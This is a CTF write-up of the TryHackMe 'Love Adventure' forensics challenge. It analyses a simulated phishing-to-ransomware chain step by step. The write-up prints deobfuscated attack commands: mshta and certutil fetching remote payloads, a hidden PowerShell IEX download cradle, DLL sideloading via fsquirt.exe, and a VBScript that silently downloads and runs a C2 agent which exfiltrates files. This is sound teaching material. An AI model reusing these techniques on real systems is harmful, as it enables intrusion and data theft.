---
title: "TryHackMe \u2014 Love Adventure (Forensics) Writeup"
date: 2026-02-27 02:32:28 +0000
categories:
- CTF
- TryHackMe
tags: []
---

# TryHackMe — Love Adventure (Forensics) Writeup

**Challenge:** Love Adventure  
**Category:** Forensics  
**Difficulty:** Hard  
**Flag:** `THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}`

---

## Overview

This challenge simulates a multi-stage malware attack chain themed around Valentine's Day. Starting from a phishing email, we trace through **7+ stages** of payload delivery — spanning JavaScript droppers, ISO files, LNK shortcuts, HTA scripts, DLL sideloading, PowerShell loaders, image steganography, VBScript downloaders, and a final C2 exfiltration agent — ultimately decrypting stolen data from a Command & Control server to recover the flag.

### Attack Chain Summary

```
Phishing Email (.eml)
  └─► HTML page + JS dropper (XOR key: VALENTINE)
        └─► ISO file (LOVE_LETTER.pdf.iso)
              └─► Malicious LNK shortcut
                    └─► HTA file (VBScript + certutil)
                          └─► CPL DLL sideload (bthprops.cpl via fsquirt.exe)
                                └─► PowerShell loader (cupid.ps1)
                                      └─► Steganographic JPG (roses.jpg, XOR key: ROSES)
                                            └─► VBScript downloader (valentine.vbs)
                                                  └─► C2 Agent (heartbeat.exe)
                                                        └─► Exfiltrated encrypted files on C2 server
```

### Infrastructure

| Domain | Purpose |
|--------|---------|
| `delivery.cupidsarrow.thm` | Phishing landing page |
| `ecard.rosesforyou.thm` | HTA delivery |
| `gifts.bemyvalentine.thm` | CPL DLL hosting |
| `loader.sweethearts.thm` | PowerShell loader |
| `cdn.loveletters.thm` | Steganographic JPG + heartbeat.exe |
| `api.valentinesforever.thm` | C2 exfiltration server |

All domains resolve to the target machine IP. Services: **port 80** (Apache 2.4.52), **port 8080** (Werkzeug/Python 3.10.12 — C2 server).

---

## Stage 1: Phishing Email

**File:** `loveletter.zip` (password: `happyvalentines`)

Extracting the ZIP gives us `valentine_ecard.eml` — a MIME email from `noreply@e-cards.valentine.local` with a Valentine's Day theme.

Key details:
- **Subject:** 💕 You've Received a Valentine's Day E-Card! 💕
- **X-Mailer:** Valentine E-Card System v2.0
- **Priority:** High
- **Phishing link:** `http://delivery.cupidsarrow.thm/card.html`

The email contains both plaintext and HTML parts, with a prominent call-to-action button directing the victim to open their "Valentine."

---

## Stage 2: JavaScript XOR Dropper

**URL:** `http://delivery.cupidsarrow.thm/card.html`  
**Files:** `card_domain.html`, `valentine-animations.js`

The landing page is a beautiful Valentine's card with floating hearts and a big "Open My Valentine 💌" button. It loads an external script `valentine-animations.js` (~112KB).

### Analysis of valentine-animations.js

The JavaScript file contains:
1. **Anti-debugging** — a timing check using `Date.getTime()` and a `debugger` string constructed from array fragments
2. **XOR decryption function** `_xd(d, k)` — XORs data with a repeating key
3. **XOR key:** `[86, 65, 76, 69, 78, 84, 73, 78, 69]` = **`VALENTINE`**
4. **Encrypted payload** — a massive base64-encoded string

The `d1()` function (triggered by the button click):
1. Base64-decodes the payload
2. XOR-decrypts with key `VALENTINE`
3. Creates a `Blob` and triggers a download as `LOVE_LETTER.pdf.iso`

### Decryption

```python
import base64

key = [86, 65, 76, 69, 78, 84, 73, 78, 69]  # VALENTINE
payload_b64 = "..."  # The massive base64 string from the JS
raw = base64.b64decode(payload_b64)
decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
# Result: ISO 9660 image file
```

---

## Stage 3: ISO + Malicious LNK

**File:** `LOVE_LETTER.pdf.iso` (64KB ISO 9660 image)

Mounting the ISO reveals a single file: `LOVE_LETTER.pdf.lnk` — a Windows shortcut file disguised as a PDF.

### LNK Analysis

The shortcut's target command uses obfuscation with caret characters (`^`) and environment variable concatenation:

```
set x=ms^ht^a && set y=http://ecard.rosesforyou.thm/love.hta && call %x% %y%
```

**Deobfuscated:** Executes `mshta http://ecard.rosesforyou.thm/love.hta`

This is a classic Living-off-the-Land technique — using the legitimate Windows `mshta.exe` to execute a remote HTA (HTML Application) file.

---

## Stage 4: HTA File (VBScript + certutil)

**URL:** `http://ecard.rosesforyou.thm/love.hta`  
**File:** `love_real.hta`

> **Note:** The server filters by User-Agent. An Internet Explorer UA string is required:  
> `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)`

The HTA file is disguised as a "Valentine's Card" application and contains VBScript obfuscated with `Chr()` encoding.

### Deobfuscated Logic

```vbscript
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempPath = fso.GetSpecialFolder(2).Path  ' %TEMP%
url = "http://gifts.bemyvalentine.thm/"
targetDir = tempPath & "\valentine"

' Create target directory
If Not fso.FolderExists(targetDir) Then fso.CreateFolder(targetDir)

' Download bthprops.cpl using certutil
cmd = "certutil -urlcache -split -f " & url & "bthprops.cpl " & targetDir & "\bthprops.cpl"
shell.Run cmd, 0, True

' Copy legitimate fsquirt.exe from System32 for DLL sideloading
fso.CopyFile systemRoot & "\System32\fsquirt.exe", targetDir & "\fsquirt.exe", True

' Execute fsquirt.exe (which sideloads bthprops.cpl)
shell.Run targetDir & "\fsquirt.exe", 0, False
```

**Technique:** DLL Sideloading — `fsquirt.exe` (Bluetooth File Transfer Wizard) legitimately loads `bthprops.cpl`. By placing a malicious `bthprops.cpl` alongside a copied `fsquirt.exe`, the attacker hijacks the DLL load.

---

## Stage 5: CPL DLL — Custom Encrypted PowerShell Launcher

**URL:** `http://gifts.bemyvalentine.thm/bthprops.cpl`  
**File:** `bthprops_real.cpl` (221KB PE32+ DLL, compiled with MinGW-w64)

> **Note:** Server requires a Microsoft UA: `Microsoft-CryptoAPI/10.0`

### Reverse Engineering

Using `objdump -d` to disassemble the binary, we find the key function `_d` (decrypt):

```c
// Decryption formula: output[i] = (encrypted[i] XOR (i * 41)) XOR 0x4C
void _d(unsigned char *encrypted, unsigned char *output, int length) {
    for (int i = 0; i < length; i++) {
        output[i] = (encrypted[i] ^ (i * 41)) ^ 0x4C;
    }
}
```

The `_p` function (called from `DllMain`) decrypts several strings using this formula:

| Encrypted (hex) | Decrypted |
|---|---|
| `1c 30 22 1d 32 22 18 3d 23` | `powershell` |
| `69 07 72 04 67 10 7f 1b 6c ...` | `-w hidden -ep bypass -nop -c` |
| `05 0b 1a` | `IEX` |
| `02 0d 11 55 01 11 51 01 4e 11` | `New-Object` |
| `02 0d 04 5a 19 07 50 1b 52 12 06 03` | `Net.WebClient` |
| `08 0d 11 48 0a 1c 42 0d 5e 3f 19 06 54` | `DownloadString` |
| Long byte array | `http://loader.sweethearts.thm/cupid.ps1` |

**Reconstructed command:**
```
powershell -w hidden -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://loader.sweethearts.thm/cupid.ps1')
```

---

## Stage 6: PowerShell Loader (cupid.ps1)

**URL:** `http://loader.sweethearts.thm/cupid.ps1`  
**File:** `cupid.ps1` (3.2KB)

### Anti-Analysis Checks

The script looks for common analysis tools before proceeding:
- `ollydbg`, `x64dbg`, `x32dbg`, `ida64.exe`, `windbg`
- `Wireshark`, `Procmon64`, `Process Mon`

### Payload Delivery via Steganography

```powershell
# 1. Download image from CDN
$url = "http://cdn.loveletters.thm/roses.jpg"
$imageData = (New-Object Net.WebClient).DownloadData($url)

# 2. Search for marker in the image data
$marker = "<!--VALENTINE_PAYLOAD_START-->"

# 3. Extract payload bytes after the marker (skip last 2 bytes)
$payloadBytes = $imageData[($markerPos + $marker.Length)..($imageData.Length - 3)]

# 4. XOR decrypt with key "ROSES" [0x52, 0x4F, 0x53, 0x45, 0x53]
$decrypted = XOR($payloadBytes, "ROSES")

# 5. Base64 decode the result
$vbsScript = [Convert]::FromBase64String($decrypted)

# 6. Save as valentine.vbs and execute
$vbsScript | Out-File "$env:TEMP\valentine.vbs"
cscript.exe //nologo "$env:TEMP\valentine.vbs"
```

---

## Stage 7: Steganographic JPG → VBScript Downloader

**URL:** `http://cdn.loveletters.thm/roses.jpg`  
**File:** `roses.jpg` (2.5KB JPEG with embedded payload)

The JPEG contains the marker `<!--VALENTINE_PAYLOAD_START-->` at byte offset 36. Everything after the marker (excluding the last 2 bytes) contains XOR-encrypted, base64-encoded VBScript.

### Extraction

```python
with open('roses.jpg', 'rb') as f:
    data = f.read()

marker = b'<!--VALENTINE_PAYLOAD_START-->'
pos = data.find(marker)
payload = data[pos + len(marker):-2]

key = b'ROSES'  # [0x52, 0x4F, 0x53, 0x45, 0x53]
decrypted = bytes([payload[i] ^ key[i % len(key)] for i in range(len(payload))])

import base64
vbs_code = base64.b64decode(decrypted)
```

### valentine.vbs (Deobfuscated)

```vbscript
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

downloadPath = fso.GetSpecialFolder(2).Path & "\heartbeat.exe"

Set xh = CreateObject("MSXML2.XMLHTTP")
xh.Open "GET", "http://cdn.loveletters.thm/heartbeat.exe", False
xh.Send

If xh.Status = 200 Then
    Set sa = CreateObject("ADODB.Stream")
    sa.Type = 1
    sa.Open
    sa.Write xh.responseBody
    sa.SaveToFile downloadPath, 2
    sa.Close
End If

ws.Run "cmd /c start """" """ & downloadPath & """", 0, False
```

Downloads `heartbeat.exe` to TEMP and silently executes it.

---

## Stage 8: C2 Agent — heartbeat.exe

**URL:** `http://cdn.loveletters.thm/heartbeat.exe`  
**File:** `heartbeat.exe` (261KB PE32+ executable, MinGW-w64)

### Static Analysis

Using `objdump` and `strings`, we identify the following:

**Key Functions:**
- `base64_encode` — Encodes credentials for HTTP auth
- `build_auth_header` — Constructs `Authorization: Basic` header
- `http_post_exfil` — POSTs data to C2 via WinINet APIs
- `exfiltrate_files` — Enumerates and sends files
- `display_ransom_note` — Shows "[HeartBeat v2.0] YOUR FILES HAVE BEEN ENCRYPTED"

**Hardcoded Credentials & Config:**

| String | Value |
|--------|-------|
| Username | `cupid_agent` |
| Password | `R0s3s4r3R3d!V10l3ts4r3Blu3#2024` |
| Auth Header | `Authorization: Basic %s` |
| Content-Type | `application/octet-stream` |
| Endpoint | `/exfil` |
| C2 Domain | `api.valentinesforever.thm` |
| C2 Port | `8080` (0x1F90) |
| Agent Name | `[HeartBeat v2.0]` |
| Auth format | `%s:%s` (username:password) |

**Base64 Auth Token:**
```
cupid_agent:R0s3s4r3R3d!V10l3ts4r3Blu3#2024
→ Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==
```

### Behavior

1. Enumerates files in the current directory (skips `.enc` files)
2. Reads each file via `CreateFileA` / `ReadFile`
3. POSTs raw file bytes to `/exfil` with Basic authentication
4. Receives **encrypted** response from the server
5. Saves encrypted response as `filename.enc`
6. Displays ransom note

**Key insight:** The encryption happens **server-side**. The client sends plaintext; the server returns ciphertext.

---

## Stage 9: Accessing the C2 Server

### Authentication

The C2 server runs on port 8080 (Werkzeug/Python). We authenticate with the credentials extracted from `heartbeat.exe`:

```python
import urllib.request, base64

creds = base64.b64encode(b"cupid_agent:R0s3s4r3R3d!V10l3ts4r3Blu3#2024").decode()

req = urllib.request.Request(
    "http://<TARGET_IP>:8080/exfil",
    headers={"Authorization": f"Basic {creds}"}
)
resp = urllib.request.urlopen(req)
print(resp.read().decode())
```

### File Listing (GET /exfil)

```json
{
  "files": [
    {"download": "/exfil/065863678632.enc", "filename": "065863678632.enc", "size": 2070},
    {"download": "/exfil/2f7537f1b977_dump.txt.enc", "filename": "2f7537f1b977_dump.txt.enc", "size": 1001},
    {"download": "/exfil/61d07abe73c3.enc", "filename": "61d07abe73c3.enc", "size": 598},
    {"download": "/exfil/8d2301ed5797_dump.txt.enc", "filename": "8d2301ed5797_dump.txt.enc", "size": 1001},
    {"download": "/exfil/e6ff5528ecc9.enc", "filename": "e6ff5528ecc9.enc", "size": 1832}
  ],
  "total": 5
}
```

All 5 `.enc` files were downloaded with authenticated GET requests.

---

## Stage 10: Cracking the Server-Side Encryption

### The Problem

We needed to determine the encryption algorithm used by the server. Since `heartbeat.exe` sends raw data and receives encrypted data back, the crypto implementation lives on the server — not in the binary we have.

### The Encryption Oracle Attack

The `/exfil` endpoint accepts **POST** requests with raw data and returns encrypted data. This gives us a **chosen-plaintext oracle**:

```bash
curl -s -X POST \
  -H "Authorization: Basic Y3VwaWRf..." \
  -H "Content-Type: application/octet-stream" \
  --data-binary "test" \
  http://<TARGET_IP>:8080/exfil
```

### Determining the Algorithm

We sent carefully crafted test data to characterize the cipher:

| Test | Input | Output (hex) | Observation |
|------|-------|-------------|-------------|
| 1 | `\x00` × 16 | `3be84b032b970c82...` | Keystream leaked |
| 2 | `\x01` × 16 | `3ae94a022a960d83...` | Each byte differs by 1 → XOR confirmed |
| 3 | `\x00` × 16 (repeat) | `3be84b032b970c82...` | **Identical** → deterministic, no IV/nonce |
| 4 | `\x00` (1 byte) | `3b` | Length-preserving |
| 5 | `AAAA` | `7aa90a42` | Consistent |
| 6 | `AAAA` (repeat) | `7aa90a42` | Deterministic |
| 7 | Sequential 0-255 | 256 bytes | Length-preserving, no padding |

**Conclusion:** The encryption is a **simple XOR with a fixed, repeating keystream**. No IV, no nonce, no block padding. Fully deterministic.

### Extracting the Keystream

Since `plaintext XOR keystream = ciphertext`, sending all zeros gives us:

```
\x00 XOR keystream = keystream
```

We extract 2100 bytes of keystream (enough for the largest file):

```python
keystream = encrypt_via_server(b'\x00' * 2100)
```

### Decrypting the Files

```python
for each .enc file:
    decrypted = bytes(enc_data[i] ^ keystream[i] for i in range(len(enc_data)))
```

### Decrypted Contents

| File | Size | Content |
|------|------|---------|
| `065863678632.enc` | 2070 | Padding — all `A` characters (0x41) with 2 leading bytes |
| `2f7537f1b977_dump.txt.enc` | 1001 | Padding — all `A` characters |
| `61d07abe73c3.enc` | 598 | **Exfiltration log with the FLAG** |
| `8d2301ed5797_dump.txt.enc` | 1001 | Padding — identical to 2f7537 (same content) |
| `e6ff5528ecc9.enc` | 1832 | Copy of `valentine.vbs` (the VBScript dropper) |

---

## The Flag

Contained in the decrypted `61d07abe73c3.enc`:

```
[EXFILTRATION LOG]
Agent: CUPID-2024
Target: VALENTINE-VICTIM
Timestamp: 2024-02-14 00:00:00 UTC

=== COLLECTED DATA ===
Username: target_user
Hostname: DESKTOP-LOVE
Domain: WORKGROUP
IP Address: 192.168.1.100
MAC Address: AA:BB:CC:DD:EE:FF

=== CREDENTIALS HARVESTED ===
Browser: Chrome
Profile: Default
Cookies: 47 entries
Saved Passwords: 12 entries

=== FILES COLLECTED ===
Documents: 156
Images: 89
Total Size: 2.4 GB

=== ENCRYPTION STATUS ===
Files Encrypted: 245
Ransom Amount: 0.5 BTC
Wallet: 1L0v3Y0uF0r3v3r4ndEv3r2024xoxo

THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}
```

## `THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}`

---

## Encryption Methods Summary

| Stage | Algorithm | Key / Method |
|-------|-----------|-------------|
| JS Dropper | XOR | Key: `VALENTINE` [86,65,76,69,78,84,73,78,69] |
| CPL DLL strings | Custom XOR | `(byte ^ (i*41)) ^ 0x4C` |
| JPG steganography | XOR + Base64 | Key: `ROSES` [0x52,0x4F,0x53,0x45,0x53] |
| C2 server encryption | Static keystream XOR | Fixed keystream extracted via chosen-plaintext attack |

---

## Tools & Techniques Used

- **Email analysis** — MIME parsing of `.eml` file
- **JavaScript deobfuscation** — Anti-debug bypass, XOR decryption
- **ISO mounting** — Extracting LNK from ISO 9660 image
- **LNK analysis** — Parsing Windows shortcut target commands
- **VBScript deobfuscation** — `Chr()` encoding reversal
- **Binary reverse engineering** — `objdump`, `strings` on PE32+ executables
- **DLL sideloading** understanding — `fsquirt.exe` + `bthprops.cpl`
- **PowerShell analysis** — String format obfuscation, hex arrays
- **Steganography** — Payload hidden after JPEG data with marker
- **HTTP authentication** — Basic auth to C2 server
- **Chosen-plaintext attack** — Encryption oracle exploitation via POST endpoint
- **User-Agent spoofing** — Different UAs required at each stage:
  - HTML: Windows Mozilla/5.0
  - HTA: MSIE 7.0
  - CPL: Microsoft-CryptoAPI/10.0

---

## Key Takeaways

1. **Multi-stage attacks** require patient, methodical tracing of each hop in the delivery chain
2. **Server-side encryption** can be cracked if the server doubles as an encryption oracle
3. **DLL sideloading** using legitimate Windows binaries (`fsquirt.exe`) is a common evasion technique
4. **Steganography** using known markers makes extraction straightforward once the format is understood
5. **XOR encryption without a nonce/IV** is trivially broken with known or chosen plaintext
6. **User-Agent filtering** at each stage simulates how malware C2 infrastructure validates requests